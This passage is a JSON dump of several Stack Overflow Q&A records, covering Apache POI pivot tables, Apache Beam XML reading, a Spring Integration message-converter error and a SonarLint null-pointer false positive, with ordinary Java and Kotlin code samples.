throws Exception {\r\n    \r\n      try (XSSFWorkbook workbook = new XSSFWorkbook(new FileInputStream(&quot;ExcelSource.xlsx&quot;)); \r\n           FileOutputStream fileout = new FileOutputStream(&quot;ExcelResult.xlsx&quot;) ) {\r\n    \r\n       XSSFSheet dataSheet = workbook.getSheetAt(0);\r\n       XSSFSheet pivotSheet = workbook.createSheet(&quot;Pivot&quot;);\r\n    \r\n       AreaReference areaReference = new AreaReference(&quot;A1:D5&quot;, SpreadsheetVersion.EXCEL2007);\r\n    \r\n       XSSFPivotTable pivotTable = pivotSheet.createPivotTable(areaReference, new CellReference(&quot;A1&quot;), dataSheet);\r\n    \r\n       addRowLabel(pivotTable, dataSheet, areaReference, 2);\r\n       addRowLabel(pivotTable, dataSheet, areaReference, 3);\r\n       addRowLabel(pivotTable, dataSheet, areaReference, 0);\r\n       addRowLabel(pivotTable, dataSheet, areaReference, 1);\r\n    \r\n       workbook.write(fileout);\r\n    \r\n      }\r\n    \r\n     }\r\n    }\r\n\r\nThis code is tested using current `apache poi 4.1.2` and needs the full jar of all of the schemas `ooxml-schemas-1.4.jar` (lower versions for older releases) as mentioned in [apache poi FAQ-N10025](https://poi.apache.org/help/faq.html#faq-N10025). ","title":"java: How to create a pivot with apache poi?","body":"<p><code>Apache poi</code> has only rudimentary support for creating pivot tables. It only creates default pivot tables but is not able creating special settings without falling back to the underlying <code>ooxml-schemas</code> classes.</p>\n<p>For your data source the following code creates what <code>apache poi</code> supports by default:</p>\n<pre><code>import java.io.FileOutputStream;\nimport java.io.FileInputStream;\n\nimport org.apache.poi.ss.SpreadsheetVersion;\nimport org.apache.poi.ss.util.AreaReference;\nimport org.apache.poi.ss.util.CellReference;\nimport org.apache.poi.xssf.usermodel.*;\n\nclass CreatePivotTableDefault {\n\n public static void main(String[] args) throws Exception {\n\n  try (XSSFWorkbook workbook = new XSSFWorkbook(new FileInputStream(&quot;ExcelSource.xlsx&quot;)); \n       FileOutputStream fileout = new FileOutputStream(&quot;ExcelResult.xlsx&quot;) ) {\n\n   XSSFSheet dataSheet = workbook.getSheetAt(0);\n   XSSFSheet pivotSheet = workbook.createSheet(&quot;Pivot&quot;);\n\n   AreaReference areaReference = new AreaReference(&quot;A1:D5&quot;, SpreadsheetVersion.EXCEL2007);\n\n   XSSFPivotTable pivotTable = pivotSheet.createPivotTable(areaReference, new CellReference(&quot;A1&quot;), dataSheet);\n\n   pivotTable.addRowLabel(2);\n   pivotTable.addRowLabel(3);\n   pivotTable.addRowLabel(0);\n   pivotTable.addRowLabel(1);\n\n   workbook.write(fileout);\n\n  }\n\n }\n}\n</code></pre>\n<p>This creates a pivot table in outline format, which is the default.</p>\n<p>If you wants creating a pivot table which is not in outline format and is not showing subtotals for each field, we need using the underlying <code>ooxml-schemas</code> classes. We need creating the correct pivot table field items. And we need to build a cache definition which has shared elements for those items. See also <a href=\"https://stackoverflow.com/questions/37305976/apache-poi-xssfpivottable-setdefaultsubtotal/40480654#40480654\">Apache POI XSSFPivotTable setDefaultSubtotal</a>.</p>\n<p>The following code should create the pivot table you wants from your data source:</p>\n<pre><code>import java.io.FileOutputStream;\nimport java.io.FileInputStream;\n\nimport org.apache.poi.ss.SpreadsheetVersion;\nimport org.apache.poi.ss.util.AreaReference;\nimport org.apache.poi.ss.util.CellReference;\nimport org.openxmlformats.schemas.spreadsheetml.x2006.main.CTPivotField;\nimport org.apache.poi.ss.usermodel.DataFormatter;\nimport org.apache.poi.xssf.usermodel.*;\n\nclass CreatePivotTable {\n\n static void addRowLabel(XSSFPivotTable pivotTable, XSSFSheet dataSheet, AreaReference areaReference, int column) { \n\n  DataFormatter formatter = new DataFormatter(java.util.Locale.US);\n  //create row label - apache poi creates as much fields for each as rows are in the pivot table data range\n  pivotTable.addRowLabel(column);\n\n  //determine unique labels in column\n  java.util.TreeSet&lt;String&gt; uniqueItems = new java.util.TreeSet&lt;String&gt;(String.CASE_INSENSITIVE_ORDER);\n  for (int r = areaReference.getFirstCell().getRow()+1; r &lt; areaReference.getLastCell().getRow()+1; r++) {\n   uniqueItems.add(formatter.formatCellValue(dataSheet.getRow(r).getCell(column)));\n  }\n  //System.out.println(uniqueItems);\n\n  //build pivot table and cache\n  CTPivotField ctPivotField = pivotTable.getCTPivotTableDefinition().getPivotFields().getPivotFieldArray(column);\n  int i = 0;\n  for (String item : uniqueItems) {\n   //take the items as numbered items: &lt;item x=&quot;0&quot;/&gt;&lt;item x=&quot;1&quot;/&gt;\n   ctPivotField.getItems().getItemArray(i).unsetT();\n   ctPivotField.getItems().getItemArray(i).setX((long)i);\n   //build a cache definition which has shared elements for those items \n   pivotTable.getPivotCacheDefinition().getCTPivotCacheDefinition().getCacheFields().getCacheFieldArray(column)\n    .getSharedItems().addNewS().setV(item);\n   i++;\n  }\n\n  //set pivot field settings\n  ctPivotField.setOutline(false); // no outline format\n  ctPivotField.setDefaultSubtotal(false); // no subtotals for this field\n\n  //remove further items\n  if (ctPivotField.getDefaultSubtotal()) i++; //let one default item be if there shall be subtotals\n  for (int k = ctPivotField.getItems().getItemList().size()-1; k &gt;= i; k--) {\n   ctPivotField.getItems().removeItem(k);\n  }\n  ctPivotField.getItems().setCount(i);\n\n }\n\n public static void main(String[] args) throws Exception {\n\n  try (XSSFWorkbook workbook = new XSSFWorkbook(new FileInputStream(&quot;ExcelSource.xlsx&quot;)); \n       FileOutputStream fileout = new FileOutputStream(&quot;ExcelResult.xlsx&quot;) ) {\n\n   XSSFSheet dataSheet = workbook.getSheetAt(0);\n   XSSFSheet pivotSheet = workbook.createSheet(&quot;Pivot&quot;);\n\n   AreaReference areaReference = new AreaReference(&quot;A1:D5&quot;, SpreadsheetVersion.EXCEL2007);\n\n   XSSFPivotTable pivotTable = pivotSheet.createPivotTable(areaReference, new CellReference(&quot;A1&quot;), dataSheet);\n\n   addRowLabel(pivotTable, dataSheet, areaReference, 2);\n   addRowLabel(pivotTable, dataSheet, areaReference, 3);\n   addRowLabel(pivotTable, dataSheet, areaReference, 0);\n   addRowLabel(pivotTable, dataSheet, areaReference, 1);\n\n   workbook.write(fileout);\n\n  }\n\n }\n}\n</code></pre>\n<p>This code is tested using current <code>apache poi 4.1.2</code> and needs the full jar of all of the schemas <code>ooxml-schemas-1.4.jar</code> (lower versions for older releases) as mentioned in <a href=\"https://poi.apache.org/help/faq.html#faq-N10025\" rel=\"nofollow noreferrer\">apache poi FAQ-N10025</a>.</p>\n"}],"owner":{"account_id":18044137,"reputation":5,"user_id":13115560,"display_name":"regis_studios"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":7427,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1640268277,"creation_date":1585317809,"question_id":60887605,"body_markdown":"    \r\nI&#39;m trying to create an Excel Pivot with apache poi, but I dont really understand how to create the format that I want. I use this code to create, but I get empty values:\r\n\r\n    XSSFPivotTable pivotTable = sheet.createPivotTable(aref, pos);\r\n    pivotTable.addColumnLabel(DataConsolidateFunction.SUM, 2, colNames[2]);\r\n    pivotTable.addColumnLabel(DataConsolidateFunction.SUM, 3, colNames[3]);\r\n    pivotTable.addColumnLabel(DataConsolidateFunction.SUM, 0, colNames[0]);\r\n    pivotTable.addColumnLabel(DataConsolidateFunction.SUM, 1, colNames[1]);\r\n\r\nMy data looks like this:\r\n\r\n[![enter image description here][1]][1]\r\n\r\nand I want it to look like this:\r\n\r\n[![enter image description here][2]][2]\r\n\r\nHow do I achieve that? \r\n\r\n\r\n  [1]: https://i.stack.imgur.com/koiB5.png\r\n  [2]: https://i.stack.imgur.com/CPnxC.png","title":"java: How to create a pivot with apache poi?","body":"<p>I'm trying to create an Excel Pivot with apache poi, but I dont really understand how to create the format that I want. I use this code to create, but I get empty values:</p>\n\n<pre><code>XSSFPivotTable pivotTable = sheet.createPivotTable(aref, pos);\npivotTable.addColumnLabel(DataConsolidateFunction.SUM, 2, colNames[2]);\npivotTable.addColumnLabel(DataConsolidateFunction.SUM, 3, colNames[3]);\npivotTable.addColumnLabel(DataConsolidateFunction.SUM, 0, colNames[0]);\npivotTable.addColumnLabel(DataConsolidateFunction.SUM, 1, colNames[1]);\n</code></pre>\n\n<p>My data looks like this:</p>\n\n<p><a href=\"https://i.stack.imgur.com/koiB5.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/koiB5.png\" alt=\"enter image description here\"></a></p>\n\n<p>and I want it to look like this:</p>\n\n<p><a href=\"https://i.stack.imgur.com/CPnxC.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/CPnxC.png\" alt=\"enter image description here\"></a></p>\n\n<p>How do I achieve that? </p>\n"},{"tags":["java","jaxb","apache-beam","apache-beam-io"],"answers":[{"tags":[],"owner":{"account_id":14798284,"reputation":1363,"user_id":10687325,"display_name":"Alexey Romanenko"},"down_vote_count":0,"up_vote_count":3,"is_accepted":true,"score":3,"last_activity_date":1589979383,"creation_date":1589979383,"answer_id":61913699,"question_id":61822778,"body_markdown":"Your XML file doesn&#39;t correspond to `XmlIO` options that you define in your pipeline - you need to have a root element that includes your records (books). One of the solutions could be something like this:\r\n\r\n```\r\nPCollection&lt;Book&gt; output = pipeline.apply(\r\n        XmlIO.&lt;Book&gt;read().from(&quot;sample.xml&quot;)\r\n            .withRootElement(&quot;books&quot;)\r\n            .withRecordElement(&quot;book&quot;)\r\n            .withRecordClass(Book.class));\r\n```\r\n\r\nand XML file should look like this:\r\n```\r\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\r\n&lt;books&gt;\r\n    &lt;book&gt;\r\n        &lt;name&gt;Harrypotter&lt;/name&gt;\r\n    &lt;/book&gt;\r\n&lt;/books&gt;\r\n```","title":"Reading an xml file in apache beam using XmlIo","body":"<p>Your XML file doesn't correspond to <code>XmlIO</code> options that you define in your pipeline - you need to have a root element that includes your records (books). One of the solutions could be something like this:</p>\n\n<pre><code>PCollection&lt;Book&gt; output = pipeline.apply(\n        XmlIO.&lt;Book&gt;read().from(\"sample.xml\")\n            .withRootElement(\"books\")\n            .withRecordElement(\"book\")\n            .withRecordClass(Book.class));\n</code></pre>\n\n<p>and XML file should look like this:</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;books&gt;\n    &lt;book&gt;\n        &lt;name&gt;Harrypotter&lt;/name&gt;\n    &lt;/book&gt;\n&lt;/books&gt;\n</code></pre>\n"},{"tags":[],"owner":{"account_id":19255478,"reputation":8414,"user_id":14072498,"display_name":"Roar S."},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1640267731,"creation_date":1640266546,"answer_id":70462862,"question_id":61822778,"body_markdown":"Just adding runnable version from question for pipeline noobs, like myself, when using newer versions of beam-sdks-java-core (2.31.0)\r\n\r\n```\r\nimport org.apache.beam.sdk.Pipeline;\r\nimport org.apache.beam.sdk.io.xml.XmlIO;\r\nimport org.apache.beam.sdk.options.PipelineOptionsFactory;\r\nimport org.apache.beam.sdk.transforms.DoFn;\r\nimport org.apache.beam.sdk.transforms.ParDo;\r\n\r\npublic class BookStore {\r\n    public static void main(String[] args) {\r\n\r\n        var pipeline = Pipeline.create(PipelineOptionsFactory.create());\r\n\r\n        pipeline\r\n                .apply(XmlIO.&lt;Book&gt;read().from(&quot;sample.xml&quot;)\r\n                        .withRootElement(&quot;books&quot;)\r\n                        .withRecordElement(&quot;book&quot;)\r\n                        .withRecordClass(Book.class))\r\n                .apply(ParDo.of(new DoFn&lt;Book, String&gt;() {\r\n\r\n                    @ProcessElement\r\n                    public void processElement(\r\n                            @Element Book element, OutputReceiver&lt;String&gt; receiver) {\r\n\r\n                        System.out.println(&quot;Xml data: &quot; + element.getName());\r\n                        receiver.output(element.getName());\r\n                    }\r\n                }));\r\n\r\n        pipeline.run();\r\n    }\r\n}\r\n```\r\n\r\nAlternative solution:\r\n```\r\nimport org.apache.beam.sdk.Pipeline;\r\nimport org.apache.beam.sdk.io.xml.XmlIO;\r\nimport org.apache.beam.sdk.options.PipelineOptionsFactory;\r\nimport org.apache.beam.sdk.transforms.MapElements;\r\nimport org.apache.beam.sdk.values.TypeDescriptors;\r\n\r\npublic class BookStore {\r\n    public static void main(String[] args) {\r\n\r\n        var pipeline = Pipeline.create(PipelineOptionsFactory.create());\r\n\r\n        pipeline\r\n                .apply(XmlIO.&lt;Book&gt;read().from(&quot;sample.xml&quot;)\r\n                        .withRootElement(&quot;books&quot;)\r\n                        .withRecordElement(&quot;book&quot;)\r\n                        .withRecordClass(Book.class))\r\n                .apply(MapElements.into(TypeDescriptors.strings())\r\n                        .via((Book book) -&gt; {\r\n                            System.out.println(&quot;Xml data: &quot; + book.getName());\r\n                            return book.getName();\r\n                        }));\r\n\r\n        pipeline.run();\r\n    }\r\n}\r\n\r\n```","title":"Reading an xml file in apache beam using XmlIo","body":"<p>Just adding runnable version from question for pipeline noobs, like myself, when using newer versions of beam-sdks-java-core (2.31.0)</p>\n<pre><code>import org.apache.beam.sdk.Pipeline;\nimport org.apache.beam.sdk.io.xml.XmlIO;\nimport org.apache.beam.sdk.options.PipelineOptionsFactory;\nimport org.apache.beam.sdk.transforms.DoFn;\nimport org.apache.beam.sdk.transforms.ParDo;\n\npublic class BookStore {\n    public static void main(String[] args) {\n\n        var pipeline = Pipeline.create(PipelineOptionsFactory.create());\n\n        pipeline\n                .apply(XmlIO.&lt;Book&gt;read().from(&quot;sample.xml&quot;)\n                        .withRootElement(&quot;books&quot;)\n                        .withRecordElement(&quot;book&quot;)\n                        .withRecordClass(Book.class))\n                .apply(ParDo.of(new DoFn&lt;Book, String&gt;() {\n\n                    @ProcessElement\n                    public void processElement(\n                            @Element Book element, OutputReceiver&lt;String&gt; receiver) {\n\n                        System.out.println(&quot;Xml data: &quot; + element.getName());\n                        receiver.output(element.getName());\n                    }\n                }));\n\n        pipeline.run();\n    }\n}\n</code></pre>\n<p>Alternative solution:</p>\n<pre><code>import org.apache.beam.sdk.Pipeline;\nimport org.apache.beam.sdk.io.xml.XmlIO;\nimport org.apache.beam.sdk.options.PipelineOptionsFactory;\nimport org.apache.beam.sdk.transforms.MapElements;\nimport org.apache.beam.sdk.values.TypeDescriptors;\n\npublic class BookStore {\n    public static void main(String[] args) {\n\n        var pipeline = Pipeline.create(PipelineOptionsFactory.create());\n\n        pipeline\n                .apply(XmlIO.&lt;Book&gt;read().from(&quot;sample.xml&quot;)\n                        .withRootElement(&quot;books&quot;)\n                        .withRecordElement(&quot;book&quot;)\n                        .withRecordClass(Book.class))\n                .apply(MapElements.into(TypeDescriptors.strings())\n                        .via((Book book) -&gt; {\n                            System.out.println(&quot;Xml data: &quot; + book.getName());\n                            return book.getName();\n                        }));\n\n        pipeline.run();\n    }\n}\n\n</code></pre>\n"}],"owner":{"account_id":18234154,"reputation":83,"user_id":13272516,"display_name":"Spiriter_rider"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1522,"favorite_count":0,"down_vote_count":0,"up_vote_count":2,"accepted_answer_id":61913699,"answer_count":2,"score":2,"last_activity_date":1640267731,"creation_date":1589556380,"question_id":61822778,"body_markdown":"problem  statement:\r\n i am  trying  to   read  and  print contents of  an  xml  file  in  beam  using  direct  runner\r\n here  is  the  code  snippet:\r\n\r\n```\r\n public  class  BookStore{\r\n\r\n public  static  void  main  (string  args[]){\r\n\r\n BookOptions options = PipelineOptionsFactory.fromArgs(args).withValidation().as(BookOptions .class); \r\n\r\n Pipeline pipeline = Pipeline.create(options);\r\n\r\n PCollection&lt;Book&gt; output = pipeline.apply(XmlIO.&lt;Book&gt;read().from(&quot;sample.xml&quot;)\r\n\t\t\t     .withRootElement(&quot;book&quot;) \r\n\t\t\t     .withRecordElement(&quot;name&quot;)\r\n\t\t\t     .withRecordClass(Book.class));  \r\n\r\n\t\t output.apply(ParDo.of(new DoFn&lt;Book,String&gt;(){\r\n             @ProcessElement \r\n             public void processElement(ProcessContext c)\r\n             {\r\n                 System.out.println(&quot;xml  data &quot;+c.element().getname());    \r\n             }\r\n          }));\r\n pipeline.run();\r\n}\r\n}\r\n```\r\n\r\nmy  pojo class:\r\n\r\n```\r\n\r\n@XmlRootElement(name = &quot;book&quot;)\r\n@XmlType(propOrder = {&quot;name&quot;})\r\npublic class Book{\r\n \r\n\tprivate String name;\r\n    @XmlElement(name = &quot;name&quot;)\r\n\tpublic String getName ()\r\n\t{\r\n\treturn name;\r\n\t}\r\n\r\n\tpublic void setName (String name)\r\n\t{\r\n\tthis.name = name;\r\n\t}\r\n\r\n\t@Override\r\n\tpublic String toString()\r\n\t{\r\n\treturn &quot;ClassPojo [name= &quot;+name+&quot;]&quot;;\r\n\t}\r\n \r\n}\r\n```\r\n\r\nmy  sample.xml  file\r\n\r\n```\r\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; \r\n&lt;book&gt;\r\n   &lt;name&gt;Harrypotter&lt;/name&gt;\r\n&lt;/book&gt;\r\n ```\r\n\r\nwhen  i  execute  the  above  code  using  direct  runner  i  am  getting  output  of  &quot;name&quot;  as  null\r\n\r\ncan somebody  guide  me  on  this.\r\n\r\nis  there  any  example  i  can  refer  into....?","title":"Reading an xml file in apache beam using XmlIo","body":"<p>problem  statement:\n i am  trying  to   read  and  print contents of  an  xml  file  in  beam  using  direct  runner\n here  is  the  code  snippet:</p>\n\n<pre><code> public  class  BookStore{\n\n public  static  void  main  (string  args[]){\n\n BookOptions options = PipelineOptionsFactory.fromArgs(args).withValidation().as(BookOptions .class); \n\n Pipeline pipeline = Pipeline.create(options);\n\n PCollection&lt;Book&gt; output = pipeline.apply(XmlIO.&lt;Book&gt;read().from(\"sample.xml\")\n                 .withRootElement(\"book\") \n                 .withRecordElement(\"name\")\n                 .withRecordClass(Book.class));  \n\n         output.apply(ParDo.of(new DoFn&lt;Book,String&gt;(){\n             @ProcessElement \n             public void processElement(ProcessContext c)\n             {\n                 System.out.println(\"xml  data \"+c.element().getname());    \n             }\n          }));\n pipeline.run();\n}\n}\n</code></pre>\n\n<p>my  pojo class:</p>\n\n<pre><code>\n@XmlRootElement(name = \"book\")\n@XmlType(propOrder = {\"name\"})\npublic class Book{\n\n    private String name;\n    @XmlElement(name = \"name\")\n    public String getName ()\n    {\n    return name;\n    }\n\n    public void setName (String name)\n    {\n    this.name = name;\n    }\n\n    @Override\n    public String toString()\n    {\n    return \"ClassPojo [name= \"+name+\"]\";\n    }\n\n}\n</code></pre>\n\n<p>my  sample.xml  file</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; \n&lt;book&gt;\n   &lt;name&gt;Harrypotter&lt;/name&gt;\n&lt;/book&gt;\n</code></pre>\n\n<p>when  i  execute  the  above  code  using  direct  runner  i  am  getting  output  of  \"name\"  as  null</p>\n\n<p>can somebody  guide  me  on  this.</p>\n\n<p>is  there  any  example  i  can  refer  into....?</p>\n"},{"tags":["java","kotlin","spring-integration"],"answers":[{"tags":[],"owner":{"account_id":3273937,"reputation":114855,"user_id":2756547,"accept_rate":75,"display_name":"Artem Bilan"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640267517,"creation_date":1640267517,"answer_id":70463056,"question_id":70460269,"body_markdown":"&gt; No HttpMessageConverter for com.abs.retrieveclientid.request.TransactionType and content type &quot;application/x-java-serialized-object&quot;\r\n\r\nThe request even doesn&#39;t reach your server. That exception is thrown from here in the `RestTemplate.doWithRequest()`:\r\n\r\n\tString message = &quot;No HttpMessageConverter for &quot; + requestBodyClass.getName();\r\n\tif (requestContentType != null) {\r\n\t\tmessage += &quot; and content type \\&quot;&quot; + requestContentType + &quot;\\&quot;&quot;;\r\n\t}\r\n\tthrow new RestClientException(message);\r\n\r\nYou need to be sure what to do with that `com.abs.retrieveclientid.request.TransactionType` in the request payload.  Perhaps you need to transform it more exactly into just a `clientId`, or convert it into a `Map` for form data in the request body. May even convert it into a JSON...\r\n\r\nWe just don&#39;t know what is your service contract. Please, clarify editing your question.","title":"Spring Integration org.springframework.web.client.RestClientException: No HttpMessageConverter","body":"<blockquote>\n<p>No HttpMessageConverter for com.abs.retrieveclientid.request.TransactionType and content type &quot;application/x-java-serialized-object&quot;</p>\n</blockquote>\n<p>The request even doesn't reach your server. That exception is thrown from here in the <code>RestTemplate.doWithRequest()</code>:</p>\n<pre><code>String message = &quot;No HttpMessageConverter for &quot; + requestBodyClass.getName();\nif (requestContentType != null) {\n    message += &quot; and content type \\&quot;&quot; + requestContentType + &quot;\\&quot;&quot;;\n}\nthrow new RestClientException(message);\n</code></pre>\n<p>You need to be sure what to do with that <code>com.abs.retrieveclientid.request.TransactionType</code> in the request payload.  Perhaps you need to transform it more exactly into just a <code>clientId</code>, or convert it into a <code>Map</code> for form data in the request body. May even convert it into a JSON...</p>\n<p>We just don't know what is your service contract. Please, clarify editing your question.</p>\n"}],"owner":{"account_id":23727084,"reputation":1,"user_id":17746840,"display_name":"starrrk"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":255,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1640267517,"creation_date":1640252718,"question_id":70460269,"body_markdown":"I keep getting the below exception in my Spring Integration project:\r\n\r\n    HTTP request execution failed for URI [http://localhost:9502/clients/clientId] in the [bean &#39;retrieveClientIdConfigurationFlow.http:outbound-gateway#0&#39; for component &#39;retrieveClientIdConfigurationFlow.org.springframework.integration.config.ConsumerEndpointFactoryBean#2&#39;; defined in: &#39;class path resource [com/abs/integration/services/RetrieveClientIDConfiguration.class]&#39;; from source: &#39;bean method retrieveClientIdConfigurationFlow&#39;]; nested exception is org.springframework.web.client.RestClientException: No HttpMessageConverter for com.abs.retrieveclientid.request.TransactionType and content type &quot;application/x-java-serialized-object&quot;here\r\n\r\nMy bean looks like this:\r\n\r\n    @Bean\r\n    fun retrieveClientIdConfigurationFlow(\r\n        xmlRequestTransformer: XmlRequestTransformer,\r\n        xmlResponseTransformer: XmlResponseTransformer,\r\n        responseTransformer: ResponseTransformer\r\n    ): IntegrationFlow =\r\n        IntegrationFlows\r\n            .from(INPUT_CHANNEL)\r\n            .transform(xmlRequestTransformer)\r\n            .handle(\r\n                Http.outboundGateway(&quot;http://localhost:9502/clients/clientId&quot;)\r\n                    .httpMethod(HttpMethod.POST)\r\n                    .expectedResponseType(String::class.java)\r\n            )\r\n            .transform(Transformers.fromJson(ClientId::class.java))\r\n            .transform(responseTransformer)\r\n            .transform(xmlResponseTransformer)\r\n            .channel(OUTPUT_CHANNEL)\r\n            .get()\r\n\r\nI receive request XML file, after which I make call to retrieve clientId which should be used to generate response XML. \r\n\r\nIt seems that clientId is not even created when executing hanlde method ( no increase in DB). When trying endpoint in postman, id is generated and content type is &quot;application/json&quot;.\r\n\r\n\r\nI have tried message converters, but none of them worked. Any suggestion would be very appreciated.","title":"Spring Integration org.springframework.web.client.RestClientException: No HttpMessageConverter","body":"<p>I keep getting the below exception in my Spring Integration project:</p>\n<pre><code>HTTP request execution failed for URI [http://localhost:9502/clients/clientId] in the [bean 'retrieveClientIdConfigurationFlow.http:outbound-gateway#0' for component 'retrieveClientIdConfigurationFlow.org.springframework.integration.config.ConsumerEndpointFactoryBean#2'; defined in: 'class path resource [com/abs/integration/services/RetrieveClientIDConfiguration.class]'; from source: 'bean method retrieveClientIdConfigurationFlow']; nested exception is org.springframework.web.client.RestClientException: No HttpMessageConverter for com.abs.retrieveclientid.request.TransactionType and content type &quot;application/x-java-serialized-object&quot;here\n</code></pre>\n<p>My bean looks like this:</p>\n<pre><code>@Bean\nfun retrieveClientIdConfigurationFlow(\n    xmlRequestTransformer: XmlRequestTransformer,\n    xmlResponseTransformer: XmlResponseTransformer,\n    responseTransformer: ResponseTransformer\n): IntegrationFlow =\n    IntegrationFlows\n        .from(INPUT_CHANNEL)\n        .transform(xmlRequestTransformer)\n        .handle(\n            Http.outboundGateway(&quot;http://localhost:9502/clients/clientId&quot;)\n                .httpMethod(HttpMethod.POST)\n                .expectedResponseType(String::class.java)\n        )\n        .transform(Transformers.fromJson(ClientId::class.java))\n        .transform(responseTransformer)\n        .transform(xmlResponseTransformer)\n        .channel(OUTPUT_CHANNEL)\n        .get()\n</code></pre>\n<p>I receive request XML file, after which I make call to retrieve clientId which should be used to generate response XML.</p>\n<p>It seems that clientId is not even created when executing hanlde method ( no increase in DB). When trying endpoint in postman, id is generated and content type is &quot;application/json&quot;.</p>\n<p>I have tried message converters, but none of them worked. Any suggestion would be very appreciated.</p>\n"},{"tags":["java","nullpointerexception","sonarqube","nullable","sonarlint"],"comments":[{"owner":{"account_id":238684,"reputation":22543,"user_id":507738,"accept_rate":71,"display_name":"MC Emperor"},"score":0,"creation_date":1640095366,"post_id":70436347,"comment_id":124510301,"body_markdown":"Well, at least, two subsequent calls to `getBody()` *could* return different results if the resulting `ResponseVO` is mutable and some other thread changes its value. That&#39;s not possible if you store it in a local variable first. However, I do not know whether this is the reason why SonarLint issues a warning here.","body":"Well, at least, two subsequent calls to <code>getBody()</code> <i>could</i> return different results if the resulting <code>ResponseVO</code> is mutable and some other thread changes its value. That&#39;s not possible if you store it in a local variable first. However, I do not know whether this is the reason why SonarLint issues a warning here."},{"owner":{"account_id":9847991,"reputation":56906,"user_id":7294900,"accept_rate":94,"display_name":"Ori Marko"},"score":0,"creation_date":1640095747,"post_id":70436347,"comment_id":124510474,"body_markdown":"@MCEmperor I don&#39;t think it&#39;s related for HttpEntity&#39;s `private final T body`","body":"@MCEmperor I don&#39;t think it&#39;s related for HttpEntity&#39;s <code>private final T body</code>"},{"owner":{"account_id":155325,"reputation":2979,"user_id":371917,"accept_rate":80,"display_name":"Peet Brits"},"score":0,"creation_date":1664527390,"post_id":70436347,"comment_id":130496833,"body_markdown":"Another way this can trigger: `MyClass debug = null; if (debug?.Buffer?.Length &gt; 0) return debug.Buffer[0];` -- assuming MyClass has a byte[] Buffer property.","body":"Another way this can trigger: <code>MyClass debug = null; if (debug?.Buffer?.Length &gt; 0) return debug.Buffer[0];</code> -- assuming MyClass has a byte[] Buffer property."},{"owner":{"account_id":155325,"reputation":2979,"user_id":371917,"accept_rate":80,"display_name":"Peet Brits"},"score":1,"creation_date":1664530245,"post_id":70436347,"comment_id":130497818,"body_markdown":"I also logged an issue: https://github.com/SonarSource/sonar-dotnet/issues/6149","body":"I also logged an issue: <a href=\"https://github.com/SonarSource/sonar-dotnet/issues/6149\" rel=\"nofollow noreferrer\">github.com/SonarSource/sonar-dotnet/issues/6149</a>"}],"answers":[{"tags":[],"owner":{"account_id":9847991,"reputation":56906,"user_id":7294900,"accept_rate":94,"display_name":"Ori Marko"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1640267314,"creation_date":1640267314,"answer_id":70463022,"question_id":70436347,"body_markdown":"Raised a [false-positive][1] in Sonar community and answered by @DamienUrruty\r\n\r\n&gt;indeed it looks like a false-positive. That said it might make the rule more complex to support this case\r\n\r\n[1]:https://community.sonarsource.com/t/sonarlint-wrong-nullpointerexception-warning-s2259-when-reusing-responseentity/55510","title":"Sonarlint false positive NullPointer warning (S2259) when using ResponseEntity","body":"<p>Raised a <a href=\"https://community.sonarsource.com/t/sonarlint-wrong-nullpointerexception-warning-s2259-when-reusing-responseentity/55510\" rel=\"nofollow noreferrer\">false-positive</a> in Sonar community and answered by @DamienUrruty</p>\n<blockquote>\n<p>indeed it looks like a false-positive. That said it might make the rule more complex to support this case</p>\n</blockquote>\n"}],"owner":{"account_id":9847991,"reputation":56906,"user_id":7294900,"accept_rate":94,"display_name":"Ori Marko"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1734,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"accepted_answer_id":70463022,"answer_count":1,"score":1,"last_activity_date":1640267375,"creation_date":1640093691,"question_id":70436347,"body_markdown":"For general restTemplate operation,as :\r\n\r\n    ResponseEntity&lt;ResponseVO&gt; response = restTemplate.postForEntity(url, entity, ResponseVO.class);\r\n    if (response.getBody() != null) {\r\n        String url = response.getBody().getUrl();\r\n\r\nI&#39;m getting wrong sonar warning when reusing the `ResponseEntity`:\r\n\r\n    A &quot;NullPointerException&quot; could be thrown; &quot;getBody()&quot; can return null. sonarlint(java:S2259)\r\n\r\nAlso if I refactor and introduce a variable no warning appears:\r\n\r\n    ResponseVO body = response.getBody();\r\n    if (body != null) {\r\n        String url = body.getUrl();\r\n\r\nI don&#39;t need to add `response != null`, if added there&#39;s a different (ok) warning:\r\n\r\n    Remove this expression which always evaluates to &quot;true&quot; [+3 locations]sonarlint(java:S2589)\r\n\r\nIs it SonarLint bug? why it warns about NullPointerException?\r\n\r\nI suspect it&#39;s related to HttpEntity `@Nullable` definition  \r\n\r\n\t@Nullable\r\n\tpublic T getBody() {\r\n\r\nI didn&#39;t find similar issue in [jira.sonarsource][1]\r\n\r\n[1]:https://jira.sonarsource.com/browse/SONARJAVA-1889?filter=-4&amp;jql=text%20~%20%22java%3AS2259%22%20order%20by%20created%20DESC\r\n","title":"Sonarlint false positive NullPointer warning (S2259) when using ResponseEntity","body":"<p>For general restTemplate operation,as :</p>\n<pre><code>ResponseEntity&lt;ResponseVO&gt; response = restTemplate.postForEntity(url, entity, ResponseVO.class);\nif (response.getBody() != null) {\n    String url = response.getBody().getUrl();\n</code></pre>\n<p>I'm getting wrong sonar warning when reusing the <code>ResponseEntity</code>:</p>\n<pre><code>A &quot;NullPointerException&quot; could be thrown; 